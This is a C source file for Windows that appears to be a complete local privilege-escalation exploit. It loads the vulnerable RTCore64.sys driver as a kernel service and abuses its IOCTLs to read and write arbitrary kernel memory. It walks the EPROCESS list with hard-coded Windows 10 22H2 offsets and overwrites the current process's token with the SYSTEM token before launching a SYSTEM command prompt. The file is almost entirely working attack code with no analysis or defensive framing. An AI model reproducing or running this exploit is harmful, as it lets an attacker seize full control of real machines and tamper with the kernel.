#include <windows.h>
#include <psapi.h>
#include <stdio.h>

typedef struct _RTCore64_Struct {
	BYTE Unknown[8];        // 0x0
	ULONG64 StartAddress;   // 0x8
	BYTE Unknown2[4];       // 0x10
	ULONG Offset;           // 0x14
	ULONG SizeType;         // 0x18
	ULONG Output;           // 0x1C
	BYTE Unknown3[16];      // 0x20
} RTCore64_Struct, * PRTCore64_Struct;  // Size: 0x30

BOOL LoadDriver(LPCSTR lpServiceName, LPCSTR lpDisplayName, LPCSTR lpBinaryPathName) {
	SC_HANDLE hManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
	if (!hManager) {
		printf(L"OpenSCManagerA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	printf("[+] OpenSCManagerA success\n");

	SC_HANDLE hService = CreateServiceA(
		hManager,
		lpServiceName,
		lpDisplayName,
		SERVICE_START | DELETE | SERVICE_STOP,
		SERVICE_KERNEL_DRIVER,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		lpBinaryPathName,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL
	);
	if (!hService) {
		printf("CreateServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] CreateServiceA success\n");

	if (!StartServiceA(hService, 0, NULL)) {
		printf("StartServiceA failed with error:%lu\n", GetLastError());
		CloseHandle(hService);
		CloseHandle(hManager);
		return FALSE;
	}

	printf("[+] StartServiceA success\n");

	CloseHandle(hService);
	CloseHandle(hManager);

	return TRUE;
}

BOOL BasicWrite(ULONG64 StartAddress, ULONG SizeType, ULONG Output) {
	RTCore64_Struct rtcore64;
	ZeroMemory(&rtcore64, sizeof(RTCore64_Struct));
	rtcore64.StartAddress = StartAddress;
	rtcore64.SizeType = SizeType;
	rtcore64.Output = Output;

	HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	DWORD bytesReturned;

	BOOL bRet = DeviceIoControl(
		hDevice,
		0x8000204C,
		&rtcore64,
		sizeof(RTCore64_Struct),
		&rtcore64,
		sizeof(RTCore64_Struct),
		&bytesReturned,
		NULL
	);
	if (!bRet) {
		printf("DeviceIoControl failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	CloseHandle(hDevice);
	return TRUE;
}

BOOL WriteKernelQWORD(ULONG64 StartAddress, ULONG64 Output) {
	ULONG low = Output & 0xFFFFFFFF;
	ULONG high = (Output >> 32) & 0xFFFFFFFF;

	if (!BasicWrite(StartAddress, 4, low)) {
		return FALSE;
	}
	if (!BasicWrite(StartAddress + 4, 4, high)) {
		return FALSE;
	}

	return TRUE;
}

BOOL BasicRead(ULONG64 StartAddress, ULONG SizeType, PULONG Output) {
	RTCore64_Struct rtcore64;
	ZeroMemory(&rtcore64, sizeof(RTCore64_Struct));
	rtcore64.StartAddress = StartAddress;
	rtcore64.SizeType = SizeType;
	// rtcore64.Output = Output;

	HANDLE hDevice = CreateFileA("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hDevice == INVALID_HANDLE_VALUE) {
		printf("CreateFileA failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	DWORD bytesReturned;

	BOOL bRet = DeviceIoControl(
		hDevice,
		0x80002048,
		&rtcore64,
		sizeof(RTCore64_Struct),
		&rtcore64,
		sizeof(RTCore64_Struct),
		&bytesReturned,
		NULL
	);
	if (!bRet) {
		printf("DeviceIoControl failed with error:%lu\n", GetLastError());
		return FALSE;
	}

	*Output = rtcore64.Output;
	CloseHandle(hDevice);
	return TRUE;

}

BOOL ReadKernelDWORD(ULONG64 StartAddress, PDWORD Output) {
	return BasicRead(StartAddress, 4, Output);
}

BOOL ReadKernelQWORD(ULONG64 StartAddress, PULONG64 Output) {
	ULONG low = 0;
	ULONG high = 0;
	if (!BasicRead(StartAddress, 4, &low)) {
		return FALSE;
	}
	if (!BasicRead(StartAddress + 4, 4, &high)) {
		return FALSE;
	}
	*Output = ((ULONG64)high << 32) | low;
	return TRUE;
}

ULONG64 GetKernelBase() {
	ULONG cbNeeded = 0;

	// 首次调用计算所需的缓冲区大小
	if (!EnumDeviceDrivers(NULL, 0, &cbNeeded)) {
		printf("EnumDeviceDrivers failed with error:%lu\n", GetLastError());
		return NULL;
	}

	ULONG64* lpImageBase = (ULONG64*)malloc(cbNeeded);
	if (lpImageBase == NULL) {
		printf("Memory allocation failed\n");
		return NULL;
	}

	if (!EnumDeviceDrivers(lpImageBase, cbNeeded, &cbNeeded)) {
		printf("EnumDeviceDrivers failed with error:%lu\n", GetLastError());
		return NULL;
	}

	ULONG64 kernelBase = lpImageBase[0];

	free(lpImageBase);

	return kernelBase;
}

ULONG GetPsInitialSystemProcessOffset() {
	HMODULE hModule = LoadLibraryA("ntoskrnl.exe");
	if(!hModule) {
		printf("LoadLibraryA failed with error:%lu\n", GetLastError());
		return 0;
	}
	ULONG64 PsInitialSystemProcess = (ULONG64)GetProcAddress(hModule, "PsInitialSystemProcess");
	if(!PsInitialSystemProcess) {
		printf("GetProcAddress failed with error:%lu\n", GetLastError());
		return 0;
	}
	ULONG offset = (ULONG)(PsInitialSystemProcess - (ULONG64)hModule);
	FreeLibrary(hModule);
	return offset;
}

ULONG64 GetPsInitialSystemProcessPtr(ULONG64 kernelBase, ULONG offset) {
	return kernelBase + offset;
}

ULONG64 GetSystemEprocessPtr() {
	ULONG64 kernelBase = GetKernelBase();
	if(!kernelBase) {
		return 0;
	}
	ULONG offset = GetPsInitialSystemProcessOffset();
	if(!offset) {
		return 0;
	}
	ULONG64 psInitialSystemProcessAddr = GetPsInitialSystemProcessPtr(kernelBase, offset);
	ULONG64 systemEprocess = 0;

	if(!ReadKernelQWORD(psInitialSystemProcessAddr, &systemEprocess)) {
		return 0;
	}

	return systemEprocess;
}
      
ULONG64 GetSystemTokenPtr(ULONG64 systemEprocess) {
	ULONG64 token = 0;
	// Windows 10 22H2
	// Token
	if (!ReadKernelQWORD(systemEprocess + 0x4b8, &token)) {
		return 0;
	}

	return token;
}

ULONG GetUniqueProcessId(ULONG64 Eprocess) {
	ULONG UniqueProcessId = 0;

	if(!ReadKernelDWORD(Eprocess + 0x440, &UniqueProcessId)) {
		return 0;
	}

	return UniqueProcessId;
}

ULONG64 GetEprocessByPid(ULONG ProcessId) {
	ULONG64 nextEprocess = 0;
	ULONG nextProcessId = 0;
	ULONG64 Flink = 0;

	nextEprocess = GetSystemEprocessPtr();
	if(!nextEprocess) {
		return 0;
	}
	nextProcessId = GetUniqueProcessId(nextEprocess);
	if (!nextProcessId) {
		return 0;
	}

	while (nextProcessId != ProcessId) {
		if (!ReadKernelQWORD(nextEprocess + 0x448, &Flink)) {
			return 0;
		}
		
		nextEprocess = Flink - 0x448;
		nextProcessId = GetUniqueProcessId(nextEprocess);
		if(!nextProcessId) {
			return 0;
		}
	}

	return nextEprocess;
}

BOOL ReloadToken(ULONG ProcessPid) {
	ULONG64 systemEprocess = 0;
	ULONG64 systemToken = 0;
	ULONG64 targetEprocess = 0;
	ULONG64 targetToken = 0;
	ULONG targetTokenRefCount = 0;
	ULONG64 newToken = 0;

	systemEprocess = GetSystemEprocessPtr();
	if (!systemEprocess) {
		return FALSE;
	}

	printf("[+] systemEprocess=0x%llx\n", systemEprocess);

	systemToken = GetSystemTokenPtr(systemEprocess);
	if(!systemToken) {
		return FALSE;
	}
	printf("[+] systemToken=0x%llx\n", systemToken);

	targetEprocess = GetEprocessByPid(ProcessPid);
	if (!targetEprocess) {
		return FALSE;
	}
	printf("[+] targetEprocess=0x%llx\n", systemEprocess);

	targetToken = GetSystemTokenPtr(targetEprocess);
	if (!targetToken) {
		return FALSE;
	}
	printf("[+] targetToken=0x%llx\n", targetToken);

	systemToken = systemToken & ~0xF;
	targetTokenRefCount = targetToken & 0xF;

	newToken = systemToken | targetTokenRefCount;

	printf("[+] newToken=0x%llx\n", newToken);
	if (!WriteKernelQWORD(targetEprocess + 0x4b8, newToken)) {
		return FALSE;
	}

	return TRUE;
}

int main() {
	LPCSTR lpServiceName = "RTCore64";
	LPCSTR lpDisplayName = "Dispaly RTCore64";
	LPCSTR lpBinaryPathName = "C:\\Users\\Public\\RTCore64.sys";

	if (!LoadDriver(lpServiceName, lpDisplayName, lpBinaryPathName)) {
		return -1;
	}

	printf("[+] LoadDriver success\n");

	PROCESS_INFORMATION pi;
	STARTUPINFOA si;
	memset(&pi, 0, sizeof(PROCESS_INFORMATION));
	memset(&si, 0, sizeof(STARTUPINFOA));

	si.cb = sizeof(STARTUPINFOA);

	if (!ReloadToken(GetCurrentProcessId())) {
		printf("ReloadToken failed\n");
		return -1;
	}

	printf("[+] ReadloadToken success\n");

	if(!CreateProcessA(NULL, "C:\\Windows\\System32\\cmd.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
		printf("CreateProcessA failed with error:%lu\n", GetLastError());
		return -1;
	}

	printf("[+] CreateProcessA system cmd success\n");

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return 0;
}

